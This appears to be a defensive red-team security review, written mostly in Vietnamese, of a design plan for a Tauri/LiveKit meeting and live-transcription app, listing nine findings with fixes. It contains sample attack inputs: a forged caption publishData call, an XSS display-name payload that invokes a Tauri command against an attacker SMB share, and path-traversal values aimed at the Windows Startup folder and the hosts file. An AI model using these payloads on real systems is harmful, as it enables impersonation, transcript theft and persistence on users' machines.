---
type: red-team-security-review
reviewer: code-reviewer (security-adversary persona)
date: 2026-06-26
target: plans/260626-1418-realtime-meeting-live-transcribe/
perspective: attacker
---

# Red Team Security Review — Realtime Meeting + Live Transcribe Plan

## Finding 1: Token Service có No-Auth — Bất kỳ ai cũng có thể tự cấp role=host

- **Severity:** Critical
- **Location:** Phase 5, section "Implementation Steps" bước 1; Phase 4, section "Related Code Files"
- **Flaw:** Token endpoint được thiết kế là `POST /token {room, name, role}` với caller tự khai `role`. Không có cơ chế xác thực ai được phép yêu cầu role=host. Phần "Chống tạo phòng/giả host trái phép" chỉ là chú thích mục tiêu, không có thiết kế cụ thể (không mention pre-shared secret, không mention invite-code, không mention meeting-owner identity verification).
- **Failure scenario:** Attacker gọi `POST /token {room:"meeting-123", name:"host", role:"host"}` từ bất kỳ máy nào. Server cấp JWT có grant host cho attacker. Attacker join phòng với quyền host, publish caption giả mạo, xem toàn bộ transcript. Phòng có thể có 2 "host" đồng thời nếu server không enforce uniqueness (plan chỉ nói "mỗi phòng tối đa 1 host" trong success criteria, không thiết kế cơ chế enforce).
- **Evidence:** phase-05:54 — `endpoint POST /token {room, name, role}` — role là input tùy ý từ client. phase-04:42 — "Create: endpoint cấp token cho web guest (role = consumer...)". Không có grep kết quả nào cho `pre-shared`, `invite`, `meeting-password`, `owner-token`, `authorization header` trong toàn bộ 5 phase file.
- **Suggested fix:** Token service phải phân tách 2 luồng: (a) host-token chỉ được cấp qua server-side flow có xác thực (pre-shared secret / signed invite link); (b) guest-token có thể self-serve nhưng role phải bị hard-code là `guest` tại server, không dùng client-supplied role field.

---

## Finding 2: Data Channel Caption Injection — Guest publish caption giả mạo host

- **Severity:** Critical
- **Location:** Phase 3, section "Architecture" + bước 4–5; Phase 4, section "Caption phía web"
- **Flaw:** LiveKit data channel cho phép mọi participant có `canPublishData=true` gửi arbitrary bytes. Plan thiết kế client nhận `DataReceived` rồi parse JSON caption và tin vào field `track`/tên người nói do sender tự đặt. Không có signing/verification caption message. Guest có `canPublish` (video/audio) — LiveKit SDK cho phép `publishData()` bất kể role nếu `canPublishData` không bị tắt tường minh.
- **Failure scenario:** Attacker join với token guest hợp lệ (canPublish video/audio). Gọi `room.localParticipant.publishData(JSON.stringify({type:"caption", track:"participant-CEO", kind:"final", text:"Tôi đồng ý tăng lương 50%", ...}))`. Mọi client (host + web) nhận DataReceived, parse JSON, render caption với tên "CEO" mà không verify sender identity. Attacker fake toàn bộ transcript của bất kỳ participant nào.
- **Evidence:** phase-03:62 — "Host nhận event caption từ Rust → `room.localParticipant.publishData(JSON, reliable)`". phase-03:63 — "Mọi client (host + sau này web): subscribe `DataReceived` → parse caption → cập nhật store → CaptionPanel render kèm tên người nói". phase-04:35 — "web client chỉ subscribe data channel + render". Không có grep nào trả về `signature`, `hmac`, `verify`, `senderIdentity` trong 5 phase files. LiveKit SDK cho phép bất kỳ participant có canPublishData gửi data.
- **Suggested fix:** (a) Tắt `canPublishData` cho guest trong JWT grant — chỉ host mới có quyền publish data channel. (b) Client render caption phải filter: chỉ tin caption từ participant có identity khớp host (verify qua `DataReceived.participant.identity`). (c) Nếu muốn defense-in-depth: host sign caption bằng HMAC với LiveKit room secret trước khi publish.

---

## Finding 3: Caption Store API Không Có Auth — Đọc Trộm Transcript Phòng Bất Kỳ

- **Severity:** Critical
- **Location:** Phase 5, section "Architecture" + Implementation Steps bước 3–4
- **Flaw:** API `fetchHistory(room)` và `push(room, caption)` được thiết kế để client gọi trực tiếp với chỉ `room` làm key. Không có thiết kế auth layer nào cho caption store API (không JWT, không API key, không verify caller là member của room). Đây là HTTP endpoint độc lập tách khỏi LiveKit auth.
- **Failure scenario 1 (đọc trộm):** Attacker đoán hoặc brute-force `room` name (plan không enforce random room ID — Phase 2 bước 6 chỉ là "form nhập room name"). Gọi `GET /caption/fetchHistory?room=meeting-daily-standup` → lấy toàn bộ transcript 24 giờ của mọi cuộc họp có tên đó.
- **Failure scenario 2 (poison store):** Attacker biết room name, gọi `POST /caption/push {room, caption}` từ ngoài, inject caption giả vào store. Late-joiner fetch history thấy caption bịa.
- **Evidence:** phase-05:56 — "API `push(room, caption)` + `fetchHistory(room)`; TTL 86400s". phase-05:57 — "client join gọi `fetchHistory` → render lịch sử". Không có mention auth token/JWT cho caption store endpoints trong toàn bộ phase-05. Hardening ở bước 8 chỉ mention rate-limit và validate room name, không mention auth cho store endpoints.
- **Suggested fix:** Caption store API phải require valid LiveKit JWT (participant phải đang trong room) hoặc một signed token từ token-service. Server verify JWT trước khi trả/nhận caption. Room name phải là opaque random ID, không phải human-readable slug.

---

## Finding 4: TURN Credential Lộ Tới Mọi Client — TURN Server Bị Lạm Dụng Làm Proxy

- **Severity:** High
- **Location:** Phase 5, section "Implementation Steps" bước 2; Architecture diagram
- **Flaw:** LiveKit client SDK nhận TURN credential (username + password) trong ICE server config để kết nối. Những credential này được gửi về browser/WebView2. Plan thiết kế static credential trong `turnserver.conf` (coturn) mà không mention short-lived TURN credential (RFC 8489 time-limited credentials). Static credential lộ có thể bị dùng để dùng TURN server làm relay proxy cho traffic không liên quan.
- **Failure scenario:** Client (attacker) extract TURN username/password từ WebRTC ICE config (accessible qua `RTCPeerConnection.getConfiguration()` hoặc DevTools). Dùng credential để kết nối TURN server và relay arbitrary TCP/UDP traffic — biến TURN server thành open proxy, consume bandwidth và tạo attribution risk (traffic xấu qua server của bạn).
- **Evidence:** phase-05:47 — "Create: `docker/coturn/turnserver.conf`". phase-05:55 — "cấu hình turnserver.conf (TURN over UDP/TCP/TLS), tích hợp credential vào LiveKit/clients". Không có mention `use-auth-secret` (HMAC-based ephemeral credentials), `credential-lifetime`, hoặc dynamic credential generation trong toàn bộ plan.
- **Suggested fix:** Dùng coturn time-limited credentials (HMAC-SHA1, RFC 8489): `use-auth-secret=<shared_secret>`, credential tự expire sau N phút. Token service generate ephemeral TURN credential cùng lúc cấp LiveKit JWT — mỗi session có credential riêng, expire khi session kết thúc.

---

## Finding 5: CSP = null Trong Tauri Config — XSS → Full Sidecar Control

- **Severity:** High
- **Location:** Phase 3, Architecture (WebView2 JS → Rust IPC path); codebase hiện tại
- **Flaw:** `tauri.conf.json:24` đang set `"csp": null` — tắt hoàn toàn Content Security Policy. Khi tích hợp `livekit-client` (thư viện bên ngoài) + xử lý caption JSON từ data channel, nếu có XSS path nào (dù là reflected từ tên participant hoặc caption text), attacker có thể thực thi JS tùy ý trong WebView2 context. WebView2 có quyền gọi toàn bộ Tauri invoke handler — bao gồm `start_recording`, `transcribe_files` (nhận path tùy ý), `split_files`, `probe_file`.
- **Failure scenario:** Attacker join phòng với display name chứa `<img src=x onerror="window.__TAURI__.invoke('transcribe_files', {paths:['\\\\attacker-smb\\evil.mp3'], ...})">`. Nếu CaptionPanel hoặc ParticipantTile render tên participant không escape → XSS → invoke Tauri command → sidecar execute với path do attacker control. Hiện tại không có XSS vector trong code (không có `v-html`) nhưng plan thêm caption rendering từ network data mà không có CSP là bề mặt tấn công mở.
- **Evidence:** `src-tauri/tauri.conf.json:24` — `"csp": null` (VERIFIED). `src-tauri/src/commands.rs:146-153` — `transcribe_files` nhận `paths: Vec<String>` tùy ý (VERIFIED). Phase-03 plan thêm CaptionPanel render text từ data channel không có sanitization mention.
- **Suggested fix:** Set CSP tối thiểu: `"csp": "default-src 'self'; script-src 'self'; connect-src 'self' wss://*"`. Khi implement CaptionPanel, render caption text bằng text node (Vue template mặc định escapes, KHÔNG dùng `v-html`). Validate và strip HTML khỏi caption text trước khi đưa vào store.

---

## Finding 6: Path Traversal trong Sidecar Protocol — `model_dir` và `file` Tùy Ý Từ Frontend

- **Severity:** High
- **Location:** `sidecar/transcriber/main.py` (codebase hiện tại); Phase 3 mở rộng protocol với `stream_start`/`stream_pcm`
- **Flaw:** Sidecar nhận `model_dir` và `file` path trực tiếp từ JSON stdin, rồi gọi `Path(model_dir).mkdir(parents=True, exist_ok=True)`, `snapshot_download(repo, local_dir=model_dir)`, `open(file)`, `write_text()` — không có whitelist hay canonicalization path. Khi Phase 3 thêm stream commands với `track` id từ JS (nhận từ data channel), nếu track id không được sanitize trước khi dùng làm path component, có path traversal.
- **Failure scenario:** XSS (Finding 5) hoặc compromised renderer gọi Tauri command với `model_dir: "../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"` → sidecar `mkdir` + write vào Startup folder → persistence. Hoặc `file: "C:/Windows/System32/drivers/etc/hosts"` → đọc và exfiltrate qua caption output path.
- **Evidence:** `sidecar/transcriber/main.py:63` — `Path(model_dir).mkdir(parents=True, exist_ok=True)` (VERIFIED). `main.py:106-113` — `out = Path(out_dir); out.mkdir(parents=True, exist_ok=True); Path(txt_path).write_text(...)` (VERIFIED). `src-tauri/src/transcribe.rs:213-216` — `model_dir` pass thẳng từ Rust sang sidecar qua `serde_json::json!` không filter (VERIFIED). Phase-03 plan thêm `{"cmd":"stream_start","track":X}` nhưng không specify sanitization cho track id.
- **Suggested fix:** Rust layer (transcribe.rs) phải canonicalize và whitelist tất cả path trước khi gửi vào sidecar: chỉ cho phép path nằm trong `app_data_dir()` subtree. Track ID chỉ được là alphanumeric. Sidecar cũng phải validate path không escape khỏi working directory.

---

## Finding 7: Supply Chain — `whisper_streaming` + `silero-vad` Không Có Pinned Version

- **Severity:** High
- **Location:** Phase 1, "Implementation Steps" bước 1; `sidecar/transcriber/requirements.txt`
- **Flaw:** Phase 1 yêu cầu thêm `whisper-streaming` và `silero-vad` vào requirements, nhưng `requirements.txt` hiện tại chỉ pin 3 package (faster-whisper==1.2.1, huggingface_hub==1.19.0, av==17.1.0). `whisper-streaming` là một project nhỏ (UFAL) không phải big-org package — không có version pin nghĩa là `pip install` có thể pull malicious update nếu maintainer bị compromise. `silero-vad` tải model qua `torch.hub.load()` từ GitHub tại runtime — không có hash verification.
- **Failure scenario 1:** Build pipeline chạy `pip install whisper-streaming` (không pin) → attacker typosquat hoặc compromise maintainer → malicious code chạy trong sidecar với quyền user → exfiltrate transcript/audio.
- **Failure scenario 2:** `silero_vad` gọi `torch.hub.load('snakers4/silero-vad', ...)` → tải model từ GitHub snakers4/silero-vad mỗi lần (không cache verify) → supply chain attack nếu repo bị compromise.
- **Evidence:** `sidecar/transcriber/requirements.txt:1-4` — chỉ có faster-whisper, huggingface_hub, av (VERIFIED). Phase-01:57 — "thêm `whisper-streaming` (hoặc tích hợp thủ công LocalAgreement), `silero-vad`, `soundfile`/`numpy`" — không mention version pin. Không có hash/checksum trong requirements.
- **Suggested fix:** Pin tất cả dependencies với version cụ thể và hash (`pip install --require-hashes`). Ưu tiên port LocalAgreement algorithm thủ công vào codebase thay vì phụ thuộc `whisper-streaming` external. Bundle silero-vad model file vào repo hoặc verify sha256 khi tải.

---

## Finding 8: WebView2 Camera/Mic — Không Có Capability Config, getUserMedia Có Thể Silent-Fail

- **Severity:** Medium
- **Location:** Phase 2, "Risk Assessment"; `src-tauri/capabilities/default.json`
- **Flaw:** Phase 2 Risk Assessment acknowledge "Tauri cần cấu hình permission (capabilities) cho getUserMedia" nhưng plan không specify cụ thể capability nào cần thêm. `default.json` hiện tại không có bất kỳ media/camera/microphone permission nào. WebView2 trên Windows yêu cầu `allowMediaRequests` hoặc Tauri capability tương đương; nếu thiếu, `getUserMedia()` throw `NotAllowedError` hoặc silent fail — meeting launch được nhưng không publish media, không có error rõ ràng cho user.
- **Failure scenario:** Host join phòng, WebView2 block getUserMedia silently (no UI prompt), livekit-client connect thành công (không cần media) nhưng không publish track. Host không biết camera/mic bị block. Transcribe không hoạt động vì không có remote track. User blame network/server thay vì permission.
- **Evidence:** `src-tauri/capabilities/default.json:1-20` — không có media permission entry (VERIFIED). `src-tauri/tauri.conf.json:23-25` — `"csp": null` nhưng không có `"dangerousRemoteDomainIpcAccess"` hay media-related config (VERIFIED). Phase-02 risk chỉ nói "kiểm tra sớm bước 2, cấu hình capabilities/" mà không chỉ ra key cụ thể.
- **Suggested fix:** Phase 2 phải specify chính xác: thêm `"media:default"` hoặc Tauri v2 WebView2 media permission config. Test `getUserMedia` là acceptance criterion bắt buộc trước khi move sang Phase 3.

---

## Finding 9: `@hobui/viui` Dependency — Unpinned External Package, Version Mismatch Risk

- **Severity:** Medium
- **Location:** Phase 4, "Architecture" + "ViUI trên web"; `package.json` codebase
- **Flaw:** Desktop app dùng `src/design-system/vi-ui/` local copy (VERIFIED: `src/design-system/vi-ui/index.ts` exists). Phase 4 plan thêm `apps/web` dùng `@hobui/viui` từ npm. Hai nguồn này sẽ diverge theo version — plan acknowledge risk nhưng giải pháp chỉ là "khóa version thống nhất". `@hobui/viui` là internal package của iNET, không public npm — nếu publish lên private registry không đúng access control, hoặc nếu package name bị typosquat trên public npm, web app tải malicious package.
- **Failure scenario:** `npm install @hobui/viui` resolves từ public npmjs.com thay vì private registry (nếu `.npmrc` không set registry chuẩn, hoặc build CI không có private registry config) → typosquatting package → malicious JS chạy trong web client.
- **Evidence:** `src/design-system/vi-ui/` exists với 17 files (VERIFIED via plan validation log). `package.json` không có `@hobui/viui` dependency hiện tại (VERIFIED). Phase-04:34 — "cài npm `@hobui/viui @hobui/tokens vuetify @tabler/icons-vue`" — không specify registry source, không specify exact version.
- **Suggested fix:** Chỉ rõ private npm registry trong `.npmrc` (`@hobui:registry=https://...`). Pin exact version. Cân nhắc tái dùng local alias thay vì npm package cho web (monorepo workspaces có thể symlink `packages/vi-ui` → dùng chung mà không qua npm).

---

## Summary

| # | Finding | Severity | Phase | Codebase Evidence |
|---|---------|----------|-------|-------------------|
| 1 | Token endpoint role=host self-service — no caller auth | Critical | 5 | phase-05:54 |
| 2 | Data channel caption injection — any guest can fake captions | Critical | 3 | phase-03:62-63 |
| 3 | Caption store fetchHistory/push — no auth, any room readable | Critical | 5 | phase-05:56-57 |
| 4 | TURN static credential — TURN server becomes open proxy | High | 5 | phase-05:55 |
| 5 | CSP=null + Tauri invoke + caption rendering — XSS→sidecar | High | 3 | tauri.conf.json:24 |
| 6 | Path traversal in sidecar protocol — model_dir/file not whitelisted | High | 3 | main.py:63,106; transcribe.rs:213 |
| 7 | Supply chain — whisper_streaming + silero-vad unpinned | High | 1 | requirements.txt:1-4 |
| 8 | WebView2 camera/mic capability missing from capabilities config | Medium | 2 | capabilities/default.json |
| 9 | @hobui/viui npm registry not specified — typosquat risk | Medium | 4 | package.json |

**Blockers trước implement:** Findings 1, 2, 3 phải được thiết kế lại trước Phase 5. Finding 5 (CSP=null) phải fix ngay trong Phase 2 trước khi tích hợp bất kỳ external JS nào.
